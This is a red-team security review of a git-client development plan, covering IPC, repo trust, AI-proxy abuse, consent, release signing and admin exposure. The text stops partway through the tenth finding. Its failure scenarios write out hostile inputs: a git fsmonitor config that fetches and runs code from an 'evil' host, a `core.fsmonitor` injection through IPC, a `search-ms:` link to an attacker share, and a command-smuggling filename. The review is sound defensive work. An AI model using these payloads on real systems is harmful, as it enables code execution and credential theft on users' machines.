# Red-team review: Security Adversary — Thaigit plan

- **Reviewer:** code-reviewer (hostile, attacker mindset) · **Date:** 2026-10-02
- **Scope:** plan.md, phase-01..09, research/researcher-01, research/researcher-02, reports/scout-report.md; Swift reference in `Sources/`, `Tests/`, `scripts/`.
- **Locked decisions respected:** Tauri 2 single codebase, owner-run Hermes proxy (no user key), owner VPS, expanded scope. The findings attack *how* these decisions are executed, not *whether*.
- **Summary:** 1 Critical · 6 High · 3 Medium. The plan's central security claim ("frontend cannot spawn arbitrary commands") is false as designed. The free AI proxy and the release chain each have a cheap, concrete attack that defeats the stated mitigations.

---

## Finding 1: `git_exec` is a generic "run git with any argv/env/cwd" IPC — any script in the webview gets arbitrary code execution
- **Severity:** Critical
- **Location:** Phase 2, sections "Requirements", "Architecture", "Security Considerations"; Phase 3 "Key Insights"; Phases 4/6 "Security Considerations"
- **Flaw:** The frontend builds the full git argv, the extra env and the cwd, and Rust executes them. Even the global safety flags are added by TS. With control of argv/env, git becomes a code-execution engine:
  - argv: `-c core.fsmonitor=<cmd> status`, `-c core.sshCommand=<cmd> fetch`, `-c alias.x='!<cmd>' x`, `--upload-pack=<cmd>`, `-c credential.helper='!<cmd>'`
  - env: `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_CONFIG_PARAMETERS`, `GIT_EXEC_PATH`, `DYLD_INSERT_LIBRARIES` (works against Homebrew git, which has no hardened runtime)

  So "frontend không spawn được lệnh tuỳ ý" (the frontend cannot spawn arbitrary commands) is false: this is `shell:allow-execute` with extra steps.

  The webview renders many attacker-controlled strings:
  - commit messages, authors, branch/tag names and file paths from cloned repos
  - askpass prompts that contain remote URLs
  - LLM output rendered as markdown by "Explain commit" on third-party commits (Phase 6). A commit can carry an indirect prompt injection that makes the model emit HTML or links.

  The Phase 4 CSP only bans `unsafe-eval` and external scripts. It does not specify a `script-src` without `'unsafe-inline'`, `img-src`/`connect-src` limits, `object-src 'none'`, or a navigation lockdown.
- **Failure scenario:**
  - (a) A markdown-sanitizer bypass or a `{@html}` slip in ExplainPanel, or in any component that renders repo strings, runs `window.__TAURI_INTERNALS__.invoke('git_exec', {args:['-c','core.fsmonitor=powershell -enc …','status'], cwd:'C:\\Users\\x', env:{}})`. Result: RCE as the user.
  - (b) Supply chain: one compromised transitive npm package bundled into the frontend (markdown renderer, virtual list, i18n) gets the same primitive without any XSS.
  - (c) Even without script execution, an unsanitised link in AI output navigates the main webview to an attacker page that imitates the askpass modal.
- **Evidence:**
  - `phase-02-rust-backend-bridge.md:29` — "`git_exec(req, on_event: Channel)`: args, cwd, stdin (bytes), env thêm, acceptExitCodes"
  - `phase-02-rust-backend-bridge.md:39` — `invoke("git_exec", {opId,args,cwd,stdin,env})`
  - `phase-02-rust-backend-bridge.md:45` — "Cờ chung do TS thêm: `-c core.quotepath=false …`" (the safety flags belong to the frontend)
  - `phase-02-rust-backend-bridge.md:84` — "frontend không spawn được lệnh tuỳ ý. Chỉ `git_exec` (binary git đã định vị)…"
  - `phase-03-typescript-core-port.md:20` — "Core phụ thuộc một interface `Exec` duy nhất … app chạy qua Rust `git_exec`"
  - `phase-06-ai-commit-features-hermes.md:28` / `:84` — Explain → "panel markdown"; "markdown đã sanitize (không chạy HTML)" (no library named, no allow-list)
  - `phase-04-ui-shell-graph-sidebar.md:88` — CSP: "không `unsafe-eval`, không tải script từ ngoài" (nothing more)
  - `Sources/NhanhCore/Git/GitRunner.swift:67-75` — the reference global args only control formatting; nothing neutralises exec-capable config
- **Suggested fix:** Keep the logic in TS but make Rust the policy point.
  1. Remove the `env` parameter. Rust builds the env from an allow-list (`GIT_OPTIONAL_LOCKS`, `GIT_LITERAL_PATHSPECS`, `GIT_INDEX_FILE`) and validates the values.
  2. Rust prepends the global `-c` flags. It rejects any frontend argument before the subcommand, and rejects `-c`, `--config-env`, `--exec-path`, `-C`, `--git-dir`, `--work-tree`, `--upload-pack`, `--receive-pack`, `-u` and `--exec` anywhere.
  3. Allow-list the subcommands; there are about 30 (`reports/scout-report.md:23`).
  4. `cwd` must be a repo id registered through a Rust `open_repo` command, from a folder the user picked in a native dialog.
  5. Use a strict CSP: `default-src 'self'; script-src 'self'; object-src 'none'; img-src 'self' blob: data:; connect-src ipc: http://ipc.localhost https://<api-domain>; frame-src 'none'`.
  6. Add an `on_navigation` handler that denies everything except the app origin.
  7. Render AI markdown with a strict allow-list: no raw HTML, no images, links shown as text behind a confirm.
  8. Add `cargo test` cases asserting that `git_exec` rejects `-c core.fsmonitor=…` and `GIT_SSH_COMMAND`.

## Finding 2: No repository-trust model — opening, drag-dropping or restoring a folder runs repo-controlled commands, and the git version floor allows RCE-on-clone versions
- **Severity:** High
- **Location:** Phase 2 "Implementation Steps" (locate); Phase 4 "Requirements" and "Security Considerations"; Phase 9 "Requirements"; scout report "Invariants to keep"
- **Flaw:**
  - The app runs `git status` automatically for any folder the user drops in or that was open last session, and again on every watcher event.
  - `git status` and `git diff` honour repo-local config that runs programs: `core.fsmonitor`, `filter.<x>.clean/process` and `diff.<x>.textconv`. Hooks also run on the commits, checkouts, merges and rebases the app drives.
  - The Swift reference neutralises none of these; it only passes `--no-ext-diff` on working-tree diffs. The plan's only "untrusted repo" concern is XSS.
  - The git floor (≥ 2.35) was chosen for features, not security. Versions 2.35.0–2.35.5 are vulnerable to CVE-2022-23521 (CVSS 9.8: a crafted `.gitattributes` causes heap corruption and RCE on clone/checkout). The Clone dialog also pre-fills URLs from the clipboard.
- **Failure scenario:** A developer receives a "take-home assignment" zip, a common lure aimed at developers. Its `.git/config` contains `[core] fsmonitor = "powershell -w hidden -c iwr evil|iex"`.
  - They drag the folder into Thaigit. `git status` runs and the payload executes.
  - Tabs are restored at launch (phase-04:29), so the payload runs again on every start.
  - The files belong to the user, so `safe.directory` never triggers.
  - On macOS the child process inherits Thaigit's TCC grants (Documents/Desktop, or Full Disk Access if granted).
- **Evidence:**
  - `phase-04-ui-shell-graph-sidebar.md:28` — "thả thư mục vào cửa sổ để mở"; `:29` — "khôi phục tab khi mở lại app"; `:35` — RepoStore refreshes on file events
  - `phase-04-ui-shell-graph-sidebar.md:87` — only "tránh XSS từ repo lạ"
  - `phase-02-rust-backend-bridge.md:55` — "yêu cầu ≥ 2.35 vì dùng `--pathspec-from-file`, `switch`, `restore`"; `phase-03-typescript-core-port.md:74`; `phase-09-windows-hardening-qa-launch.md:30` — "một bản cũ (≥ 2.35)"
  - `Sources/NhanhCore/Git/GitRepository.swift:92-96` — status runs with only `GIT_OPTIONAL_LOCKS=0`; `:165` — `--no-ext-diff` without `--no-textconv`
  - `Sources/NhanhCore/Git/GitRunner.swift:67-75` — no `core.fsmonitor`, `core.hooksPath` or `safe.bareRepository` override
  - `reports/scout-report.md:26` — the invariants list has no trust flags
  - External: CVE-2022-23521 is fixed in 2.35.6 / 2.36.4 / … / 2.39.1
- **Suggested fix:**
  - Add a trust gate. Repos that Thaigit created or cloned are trusted. Any other folder opens in "restricted mode" until the user confirms. Show the exec-capable keys found with `git config --show-origin --get-regexp '^(core\.(fsmonitor|hookspath|sshcommand)|filter\..*|diff\..*\.(textconv|command)|merge\..*\.driver|credential\..*|uploadpack\..*|protocol\..*)'`.
  - Restricted mode (enforced in Rust):
    - `-c core.fsmonitor=false -c core.hooksPath=<empty-dir>`
    - `--no-textconv --no-ext-diff`
    - no auto-fetch
  - Always set `-c safe.bareRepository=explicit -c protocol.file.allow=user`.
  - Turn the git floor into a security floor: refuse clone/fetch below the newest patched release of each series, warn otherwise.
  - Validate clipboard-prefilled clone URLs: show the parsed host and reject `ext::`, `fd::` and a leading `-`.

## Finding 3: The free AI proxy is easy to farm, and the "hard" $2/day cap is a kill switch the attacker controls for every user
- **Severity:** High
- **Location:** Phase 7 "Requirements" (endpoints, defaults), "Implementation Steps" 3–4, "Risk Assessment"; Phase 6 "Security Considerations"
- **Flaw:**
  - **The install token proves nothing.** `/v1/install` mints a valid HMAC token for any UUID the client picks (idempotent, no proof of a real install). Beyond the per-IP rate limit it adds nothing, so a per-install quota is really a per-attacker-UUID quota.
  - **The global $ cap is the only hard stop.** The plan relies on it explicitly, which turns any abuse into an outage for everyone.
  - **Budget accounting lags.** The budget sums `cost_usd_micros` written at stream end, so in-flight requests are invisible to the check. Aborted streams have no `usage` frame and are only estimated.
  - **Errors double the load.** An upstream error triggers a retry on the fallback model.
  - **Upstream limits are not planned for.** The RPM/TPM of a pay-as-you-go account is unknown; research lists the Free tier at 45 RPM / 450k TPM.
  - **Other public endpoints have no rate limits:** `/v1/update` records `X-Install-Id` without checking the token, and `/download/*` inserts a row on every GET.
- **Failure scenario:**
  - **Budget drain:**
    - A maximum-size request is about 16k input tokens, roughly $0.0008 at the plan's prices, so $2 buys about 2,300–2,500 requests.
    - At 30 commit requests per install per day, that needs about 80 install tokens. At 10 registrations/hour/IP, 8 IPs mint them in an hour; one IPv6 /64 is enough if the limiter keys on full addresses.
    - At 30 req/min/IP, the budget is gone in about 10 minutes.
    - Every legitimate user then gets 503 until the daily reset. The attacker can repeat this every day at near-zero cost.
  - **Upstream saturation:** if the account has Free-tier-like limits (UNVERIFIED), one IP sending 30 maximum-size requests/min already exceeds 450k TPM, and everyone else gets upstream 429s.
  - **Disk fill:** separately, a script hitting `/v1/update/windows/x86_64/0.0.1` with random `X-Install-Id`s writes unbounded `daily_active` rows, kept for 400 days. On a 1 vCPU / 1 GB box with single-writer SQLite this can fill the disk, block AI quota transactions and make the DAU dashboard meaningless.
- **Evidence:**
  - `phase-07-vps-server-ai-proxy-stats-updater.md:37` — "`/v1/install` | `{installId, platform, appVersion}` → `{token}` (HMAC). Idempotent. Giới hạn 10 lần/giờ/IP"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:48` — "commit 30 lượt/ngày/cài đặt; … 30 request/phút/IP; trần **$2/ngày** … tối đa 16k token đầu vào"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:82` — "budget (tổng `cost_usd_micros` hôm nay so với trần)"; `:83` — "ghi usage (lấy `usage` cuối stream nếu có, không thì ước lượng) … Upstream lỗi → thử model dự phòng 1 lần"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:109` — "Lạm dụng (giả UUID, script spam): chặn bằng trần $/ngày (giới hạn cứng)"
  - `phase-06-ai-commit-features-hermes.md:81` — "Token cài đặt không phải bí mật tuyệt đối … chỉ dùng để gắn quota"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:27` — "không cần gói thuê bao"; `research/researcher-02-hermes-ai-backend-report.md:16` — "Free: 45 RPM, 450k TPM"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:43` — "Có `X-Install-Id` thì ghi hoạt động trong ngày" (no token check); `:65`, `:86` (400-day retention), `:49` (1 vCPU / 1 GB)
- **Suggested fix:**
  - Budget: reserve-then-reconcile. Debit the maximum possible cost when a request is admitted and refund the difference on completion.
  - Concurrency: a global in-flight cap (for example 8 streams) and 1 concurrent stream per install.
  - Per-IP limits on both `/v1/install` and AI, keyed on /24 for IPv4 and /64 for IPv6.
  - Tiered budget: keep most of the daily cap for installs older than N days with a history of token-verified update checks. New installs share a small slice, so farmed tokens can't starve established users.
  - Add an `id_hash` denylist, and don't retry on the fallback model after a 429 or budget error.
  - Rate-limit `/v1/update`, `/download` and `/v1/install` in Caddy.
  - Record activity only for token-verified installs, and alert on disk usage.
  - Confirm the account's real RPM/TPM before launch and size quotas to it.

## Finding 4: The consent design contradicts itself — every install is registered and trackable before, and regardless of, consent
- **Severity:** High
- **Location:** Phase 6 "Requirements" (install identity) and "Architecture"; Phase 7 "Key Insights", schema, "Security Considerations"; Phase 8 "Requirements" and "Success Criteria"
- **Flaw:**
  - Phase 6 registers the install on first run, sending `POST /v1/install` with installId, platform and appVersion. This happens before the Phase 8 onboarding asks for statistics consent, and before AI consent.
  - Every AI call sends `X-Install-Id`.
  - The server keeps `installs(id_hash, created_at, last_seen_at, platform, app_version)` and stores `id_hash` on every `ai_requests` row. The `last_seen_at` update source is not specified.
  - One identifier links the statistics and AI purposes, so declining statistics does not stop a user being counted.
  - Phase 8's success criterion ("no statistics consent → server never receives `X-Install-Id`") cannot pass by design.
  - Update checks run every 6 hours from every install. They leave IP + version + timestamp in reverse-proxy logs: nginx logs these by default, and the plan allows reusing an existing nginx. "Không lưu IP" (no IPs stored) is promised only for the downloads table.
- **Failure scenario:** A user declines statistics during onboarding.
  - First launch has already called `/v1/install` and created an `installs` row with their platform and version.
  - Each AI use adds `ai_requests` rows under the same `id_hash`.
  - Nginx logs their IP every 6 hours.

  The operator can therefore compute retention and activity for users who refused. The privacy page, which the plan requires to be "trung thực" (truthful), becomes false. This conflicts with the consent-first rule the plan itself cites (Decree 13 / PDPL 2026).
- **Evidence:**
  - `phase-06-ai-commit-features-hermes.md:32` — "lần chạy đầu tạo UUID → `POST /v1/install` nhận token"
  - `phase-06-ai-commit-features-hermes.md:41` — "headers: X-Install-Id, X-Install-Token, X-App-Version"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:29` — "gửi `X-Install-Id` chỉ khi người dùng đã đồng ý"; `:64` — `installs(… last_seen_at, platform, app_version)`; `:67` — `ai_requests(… id_hash …)`; `:84` — "không lưu IP" (downloads only); `:87` — "hoặc chỉ api nếu VPS đã có nginx"; `:119` — Decree 13
  - `phase-08-landing-page-release-pipeline.md:33` — "kiểm khi mở app và mỗi 6 giờ"; `:34` — onboarding consent; `:75` — success criterion; `:85` — "Trang privacy trung thực"
  - `research/researcher-02-hermes-ai-backend-report.md:286-287` — "Consent is purpose-specific; cannot be catch-all"
- **Suggested fix:**
  - Register (`/v1/install`) only after the user accepts AI consent.
  - Use two independent random identifiers:
    - an AI-quota id, sent only to `/v1/ai/*`, used only for `ai_quota` and never written to `installs`
    - a statistics id, sent only when statistics consent is given
  - Create `installs` and `daily_active` rows only from consenting update checks.
  - Turn off or IP-truncate `/v1/*` access logs in Caddy/nginx, and document how long the in-memory rate limiter keeps IPs.
  - Add a server test proving that a non-consenting client creates no `installs` or `daily_active` rows.

## Finding 5: The AI payload filter checks filenames only, and the consent text promises retention the provider doesn't guarantee
- **Severity:** High
- **Location:** Phase 6 "Architecture" (filter rules), "Requirements" (consent; explain/PR), "Success Criteria"
- **Flaw:**
  - **The filter matches filenames only.** It excludes `.env*`, `*.pem`, `*.key`, `id_rsa*`, `*.p12`, and misses the most common real leaks:
    - `id_ed25519`, the default modern SSH key name
    - `.npmrc`, `.pypirc`, `.netrc`, `.git-credentials`, `credentials.json`
    - `*.tfvars`, `*.tfstate`, `kubeconfig`, `appsettings*.json`
    - `*.pfx`, `*.jks`, `*.keystore`
    - most of all, secrets hard-coded in ordinary source files (`AKIA…`, `ghp_…`, `xox…`, `-----BEGIN … PRIVATE KEY-----`)
  - **No content scan:** nothing looks inside the files.
  - **More code leaves the machine than the button suggests.** Explain-commit and PR-description send diffs of other people's commits and whole-branch diffs. The 10 recent subjects can include ticket titles or customer names.
  - **The consent text over-promises.** It tells users content is "không lưu" (not stored) on the path Thaigit → Nous Research. The Nous Portal privacy policy (updated 2026-09-28) says it collects prompts and outputs, and may use them for training unless Privacy Mode is on. Privacy Mode does not bind third-party providers. The plan never enables or checks Privacy Mode, or which backend actually serves Hermes.
  - **BYOK (stretch) has no key-storage plan.** plugin-store is plaintext JSON. BYOK also needs an arbitrary-host HTTP scope, which contradicts "scope đúng domain".
- **Failure scenario:**
  - A user stages `src/config/aws.ts` with a production `AKIA…` key and secret, then clicks "✨ Viết bằng AI".
  - The diff passes every filename rule and goes to the VPS, then to Nous. With Privacy Mode off it may be retained or used for training.
  - The app's own consent text said otherwise. That is a misrepresentation under the consent-first regime the plan cites, and a cross-border transfer the plan never assesses.
- **Evidence:**
  - `phase-06-ai-commit-features-hermes.md:44` — "file nhạy cảm (`.env*`, `*.pem`, `*.key`, `id_rsa*`, `*.p12`)"
  - `phase-06-ai-commit-features-hermes.md:73` — the test covers only "`.env`, lockfile, ảnh"
  - `phase-06-ai-commit-features-hermes.md:30` — "gửi tới đâu (server Thaigit → Nous Research), không lưu nội dung"
  - `phase-06-ai-commit-features-hermes.md:22` — 10 recent subjects; `:28-29` — Explain / PR description; `:33` — BYOK; `:50` — "giới hạn scope đúng domain"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:119` — the legal section covers statistics only
  - External: portal.nousresearch.com/privacy — collects "prompts … inputs, outputs … API calls". Privacy Mode: "will not store your inference payloads and will not use such inference payloads for training", which does not cover third-party providers.
- **Suggested fix:**
  - Add content-based secret scanning to `context-builder.ts`: a gitleaks-style set of about 20 high-signal regexes plus an entropy check. Drop the hunk and tell the user what was removed.
  - Expand the filename denylist and support a `.thaigitignore-ai`. Show a payload preview on first use.
  - Enable Nous Privacy Mode, pin a Nous-hosted route, and record both in `docs/`.
  - Word the consent around what the owner can guarantee, for example: "The Thaigit server doesn't store content; Nous Research processes it under <policy>, with Privacy Mode on."
  - Store BYOK keys in the OS keychain (`keyring` crate) and make BYOK calls from Rust, so the webview HTTP scope stays a single domain.
  - Get legal sign-off on cross-border transfer under PDPL / Decree 13.

## Finding 6: The updater signing key, Apple credentials, VPS deploy key and admin release token all sit in one GitHub account and one build job
- **Severity:** High
- **Location:** Phase 8 "Architecture", "Implementation Steps" 1–2, "Risk Assessment", "Security Considerations"; Phase 7 "Implementation Steps" 6, 8–9; Phase 1 step 6; Phase 9 "Security Considerations"
- **Flaw:**
  - **Signing runs inside the build.** Updater signing is a step in the same `release.yml` matrix job that runs `pnpm install` (postinstall scripts from hundreds of packages), `cargo build` (every crate's `build.rs`) and third-party actions. All of that code can reach `TAURI_SIGNING_PRIVATE_KEY`, its password, the `APPLE_*` secrets and `CI_RELEASE_TOKEN`.
  - **The reviewer gate is self-approval.** "Environment with reviewer" means the solo developer approves their own release.
  - **The same account controls the server too.** It holds the VPS SSH deploy key and GHCR push rights. Docker-group access is root-equivalent, which exposes the Hermes key in the container env and the database.
  - **Apple credentials are over-scoped.** `APPLE_ID` + `APPLE_PASSWORD` is an app-specific password on the owner's personal Apple ID. App Store Connect API keys are the scoped alternative.
  - **No rotation path.** The Tauri updater trusts one pubkey and the plan has no way to rotate it. Its mitigation, "only CI uses it", is itself the exposure.
  - **Audits don't help.** `cargo audit` and `pnpm audit` do not detect malicious packages.
- **Failure scenario:**
  - A worm-style npm compromise (the 2025 secret-harvesting campaigns targeted CI env), or a hijacked action tag, runs during `pnpm install` in `release.yml`. It exfiltrates the minisign key, its password and `CI_RELEASE_TOKEN`.
  - The attacker signs a trojaned `.app.tar.gz`/NSIS build and posts it to `/admin/api/releases`.
  - Within 6 hours every installed Thaigit shows "Có bản Thaigit x.y.z — Cập nhật & khởi động lại" (update available, update & restart) and installs a payload that passes signature verification.
  - The only recovery is shipping a new pubkey in an update signed with the stolen key, which the attacker can also do.
- **Evidence:**
  - `phase-08-landing-page-release-pipeline.md:43` — "ký updater bằng TAURI_SIGNING_PRIVATE_KEY (+PASSWORD)" (inside the build matrix)
  - `phase-08-landing-page-release-pipeline.md:55` — "lưu private key + mật khẩu vào GitHub Secrets"
  - `phase-08-landing-page-release-pipeline.md:56` — "`APPLE_CERTIFICATE`, `APPLE_ID`, `APPLE_PASSWORD`, `APPLE_TEAM_ID`"
  - `phase-08-landing-page-release-pipeline.md:79` — "Mất/lộ khoá updater → … Giảm thiểu: lưu 2 nơi, mật khẩu mạnh, chỉ CI dùng"
  - `phase-08-landing-page-release-pipeline.md:83` — "environment `release` có reviewer bảo vệ"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:85` — "API `POST /admin/api/releases` cho CI (Bearer `CI_RELEASE_TOKEN`)"; `:88` — "push GHCR → SSH vào VPS `docker compose pull && up -d`"
  - `phase-01-foundation-branding.md:52` — "Cache pnpm + cargo"; `phase-09-windows-hardening-qa-launch.md:78` — only `cargo audit` / `pnpm audit`
  - Tauri updater docs: a single `pubkey`; rotation only through runtime builder logic
- **Suggested fix:**
  - **Separate building from signing:**
    - Build jobs get no secrets. Use `pnpm install --frozen-lockfile` (with `--ignore-scripts` where possible), pin actions by SHA, and don't restore caches in release.
    - A separate step only downloads artifacts, verifies hashes and runs `tauri signer sign`. For a solo developer this is safest on the owner's offline machine.
  - **Scope every credential:**
    - Use an App Store Connect API key instead of Apple ID + app-specific password.
    - Give the VPS deploy key a forced command (`command="docker compose pull && docker compose up -d"`, no shell).
    - Use a separate, least-privilege release token.
    - Keep the Hermes key out of the compose env (use a Docker secrets file).
  - **Plan for compromise:**
    - Ship runtime pubkey rotation from v0.1: a builder `pubkey` override with an embedded "next" key.
    - Write a key-compromise runbook.
  - **Protect the account:** GitHub 2FA with a hardware key, plus tag protection.

## Finding 7: Installer downloads and update manifests trust whatever the VPS database says — no checksums, and the manifest can roll users back
- **Severity:** High
- **Location:** Phase 7 endpoints `/download/:asset` and `/v1/update/...`; Phase 8 "Requirements", "Non-functional", "Risk Assessment"
- **Flaw:**
  - **First installs have no integrity check.** `/download/*` 302s to, or serves, the URL stored in `releases.assets_json`. Anyone holding `CI_RELEASE_TOKEN`, or with VPS/admin access, can change it.
  - **Users are trained to bypass OS checks.** Installers have no published SHA-256 or minisign signature, the beta is not OS-signed, and the FAQ teaches users to click through Gatekeeper/SmartScreen.
  - **Updates can be rolled back.** Tauri verifies the artifact signature only; the version comes from the unsigned manifest. A compromised server can serve an old, genuinely signed, vulnerable build labelled with a higher version, and roll back every user.
  - **The "valid signature" rule can't work as written.** The requirement "never publish a manifest without a valid signature" has no server-side pubkey check, and wouldn't stop rollback anyway.
- **Failure scenario:**
  - An attacker gets into the VPS. That one box serves the public site, admin and API, with `/admin` on the public origin.
  - **New users:** the attacker edits `assets_json.windows-x86_64.url` to point at a trojaned NSIS installer. A new user clicks "Tải cho Windows" (download for Windows), sees SmartScreen, follows the FAQ's "Thông tin thêm → Vẫn chạy" (More info → Run anyway) and is infected.
  - **Existing users:** the attacker publishes `version: 9.9.9` with the URL and `.sig` of v0.1.0, an old build that still has the Finding 1 IPC flaw. The updater accepts it and every client downgrades.
- **Evidence:**
  - `phase-07-vps-server-ai-proxy-stats-updater.md:42` — "`/download/:asset` … → ghi 1 lượt → 302 hoặc trả file"; `:43` — manifest `{version, notes, pub_date, url, signature}` read from the DB
  - `phase-08-landing-page-release-pipeline.md:45` — "POST /admin/api/releases {version, notes, assets{…: url, signature, size}}"
  - `phase-08-landing-page-release-pipeline.md:31` — "FAQ (Gatekeeper/SmartScreen nếu chưa ký)"; `:56` — "không ký trước (bản beta)"; `:78` — "FAQ có ảnh hướng dẫn"
  - `phase-08-landing-page-release-pipeline.md:36` — "chưa có chữ ký hợp lệ thì không bao giờ phát manifest updater"
  - Tauri updater docs: the signature is "the content of the generated `.sig` file" over the bundle. The default check is "update version is greater than the current app version", which reads the manifest field.
- **Suggested fix:**
  - **Installers:**
    - Publish `SHA256SUMS` plus a minisign signature for every installer, with the pubkey on the landing page and in the README.
    - Have `/download/*` serve only allow-listed hosts and filenames matching `^Thaigit_<semver>_…$`.
  - **Updates:**
    - Bind the version to signed data. Tauri's minisign signature includes a signed trusted comment (`file:Thaigit_<ver>_…`). In a custom `version_comparator`, parse it from `signature` and require it to equal the manifest version. First confirm that Tauri's verification covers the trusted comment.
    - Keep a client-side "highest version ever installed" and refuse anything lower.
  - **Before public launch:** prioritise Windows and macOS code signing instead of documenting bypasses.

## Finding 8: The admin plane is public, shares an origin with the marketing site, uses a single factor, and can be locked out exactly when it's needed
- **Severity:** Medium (High if the release API also accepts admin-session auth)
- **Location:** Phase 7 "Requirements" (`/admin/*`), "Implementation Steps" 6, "Security Considerations"; plan.md "Kiến trúc tổng quát"
- **Flaw:**
  - **Same origin as the public site.** `/admin` shares the origin of the landing page and API, so `SameSite=Strict` gives no protection against same-origin script. Any script on the landing page (an analytics snippet, a compromised Astro integration) can read the CSRF token from `/admin` and act while the owner is logged in.
  - **Lockout is a remote off-switch.** "Lock 15 minutes after 5 failures" on a single-admin system lets an attacker lock the owner out of the kill switch at will.
  - **Weak login.** There is no MFA, and the IP allow-list is optional.
  - **Admin settings can drain credit.** They can change the model and raise the $/day cap, so a compromised admin can drain the owner's prepaid Nous balance (or the card behind auto-recharge).
  - **Stored XSS risk.** The dashboard renders attacker-supplied, unauthenticated strings: `platform` and `appVersion` from `/v1/install`, the `:currentVersion` path segment, and `referrer_host`. If any view uses raw HTML, that is stored XSS into the admin session.
  - **Login flood starves the proxy.** Argon2id on a 1 vCPU / 1 GB box lets a login flood starve the AI proxy.
- **Failure scenario:** During a Finding 3 abuse wave, the attacker also sends 5 wrong passwords every 14 minutes. The owner can't log in to flip "tắt AI" (turn off AI) or lower quotas, and the outage and cost continue until they SSH in.
- **Evidence:**
  - `plan.md:38-42` — `/` landing, `/download/*`, `/v1/*` and `/admin` on one host
  - `phase-07-vps-server-ai-proxy-stats-updater.md:18` — "Phục vụ landing page"; `:45` — "`/admin/*` | … cài đặt (tắt AI, trần $/ngày, quota, model), API cho CI đăng release"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:85` — "argon2id, khoá 15 phút sau 5 lần sai … SameSite=Strict, CSRF"
  - `phase-07-vps-server-ai-proxy-stats-updater.md:117` — "tuỳ chọn chỉ cho IP của bạn"; `:37` — client-supplied `platform, appVersion`; `:49` — 1 vCPU / 1 GB
- **Suggested fix:**
  - **Get admin off the public origin.** Bind it to 127.0.0.1 and reach it through an SSH port-forward or WireGuard/Tailscale. At minimum, use a separate subdomain with an IP allow-list plus TOTP/WebAuthn.
  - **Fix the lockout.** Use per-IP progressive delay instead of account lockout.
  - **Add a kill switch that doesn't need the web login:** a file or env flag read on every request, toggled over SSH.
  - **Cap admin power.** Put hard limits in env that the admin UI cannot exceed (`MAX_DAILY_BUDGET_USD`, a model allow-list).
  - **Validate dashboard inputs.** Check `platform`, `appVersion` and `currentVersion` as enum/semver at ingestion, and ban raw HTML in Hono JSX views.
  - **Isolate CI.** Give the CI release API its own path and a token that can do nothing else.

## Finding 9: OS-integration commands accept frontend strings with no scheme or path policy, and "không qua shell" is false for `.cmd` launchers
- **Severity:** Medium
- **Location:** Phase 2 "Requirements" (OS integration), "Implementation Steps" 5, "Security Considerations"; Phase 5 "Security Considerations"; Phase 4 "Related Code Files" (opener capability)
- **Flaw:**
  - **No policy on these commands.** Open URL, open terminal/editor at a path, and move-to-Trash have no scheme allow-list, no path scoping and no confirmation.
  - **Open URL reaches dangerous Windows handlers.** Unfiltered, it hits protocol handlers: `search-ms:`/`ms-msdt:`-style handlers have historically been code-execution vectors, and `file://\\attacker\share` leaks NTLM hashes. Commit messages, remote URLs and AI/PR markdown can all supply such URLs.
  - **The editor launcher goes through a shell.** It is `code.cmd`, and Windows runs `.cmd` through `cmd.exe`, which re-parses the arguments. Repo-controlled file names can contain `&`, `^` and `%`, all legal on NTFS. This is the BatBadBut class (CVE-2024-24576). It is safe only with Rust ≥ 1.77.2 and without hand-rolled quoting, and the plan pins only "Rust stable".
  - **`opener` is granted without a stated scope.** An unscoped `open_path` on Windows runs `.exe`, `.bat`, `.lnk` and `.hta` files.
  - **Trash takes any path,** which matters given Finding 1.
- **Failure scenario:**
  - **Protocol handler:** a malicious repo's commit message contains `[docs](search-ms:query=x&crumb=location:\\attacker\share)`. The user clicks it in commit detail or the Explain panel. Explorer opens an attacker share that looks like a local folder, containing a "README.pdf.lnk".
  - **Shell parsing:** "Open in VS Code" on a cloned file named `a&calc&.md`, with an old toolchain or hand-rolled quoting, runs `calc`.
- **Evidence:**
  - `phase-02-rust-backend-bridge.md:34` — "mở editor …, hiện trong Finder/Explorer, đưa file vào Thùng rác (crate `trash`), mở URL"
  - `phase-02-rust-backend-bridge.md:58` — "Windows: `wt.exe`, `code.cmd` trong PATH"
  - `phase-02-rust-backend-bridge.md:85` — "Args truyền dạng mảng (không qua shell) … không có shell injection"
  - `phase-05-staging-diff-conflicts-drag-drop.md:80` — "'Mở bằng editor' truyền path dạng tham số, không qua shell."
  - `phase-04-ui-shell-graph-sidebar.md:52` — capabilities "(dialog, opener, clipboard, store, …)" with no scope
  - `phase-01-foundation-branding.md:27` — "Rust stable" (no minimum version)
- **Suggested fix:**
  - `open_url`: allow only `https:` (and `mailto:` behind a confirm), and show the full URL before opening anything that came from repo or AI text.
  - Editors: resolve the real `.exe` (for example `Code.exe` via App Paths) and never launch `.cmd`/`.bat`.
  - Pin `rust-version = "1.77.2"` or later in Cargo.toml.
  - Scope `opener` to URLs only, with no `open_path`.
  - Restrict trash and open-in-editor paths to the registered repo root after `dunce::canonicalize`, rejecting symlinks that lead outside it.

## Finding 10: Credentials leak sideways — a session-wide askpass token in every git child's environment, and an unredacted command log users are told to share
- **Severity:** Medium
- **Location:** Phase 2 "Key Insights", "Architecture", step 3, "Security Considerations"; Phase 3 step 2; Phase 5 dialogs; Phase 9 "Risk Assessment"
- **Flaw:**
  - **(a) The askpass token reaches every git child process.**
    - `THAIGIT_ASKPASS_PORT` and `THAIGIT_ASKPASS_TOKEN` are exported to every git process. Everything git spawns inherits them: hooks, filters, ssh, credential helpers, git-lfs.
    - The token lasts the whole session, requests aren't tied to a running operation, and the timeout is 5 minutes.
    - So any descendant, for example a hook from a Finding 2 repo, can open Thaigit's own trusted hidden-input modal at any later time and receive what the user types.
    - The prompt text includes attacker-chosen URLs, for example `https://github.com%2F@evil.example`, which a truncated modal may show as just "github.com".
  - **(b) The command log keeps credentials.**
    - The command log is ported 1:1. It stores the full argv and up to 4,000 characters of stderr.
    - Clone and remote URLs with embedded tokens end up there, for example `https://oauth2:glpat-…@gitlab.com/…`, a pattern GitLab documents.
    - Phase 9 tells users to copy this log and send it, with GitHub Issues as the feedback channel.
- **Failure scenario:**
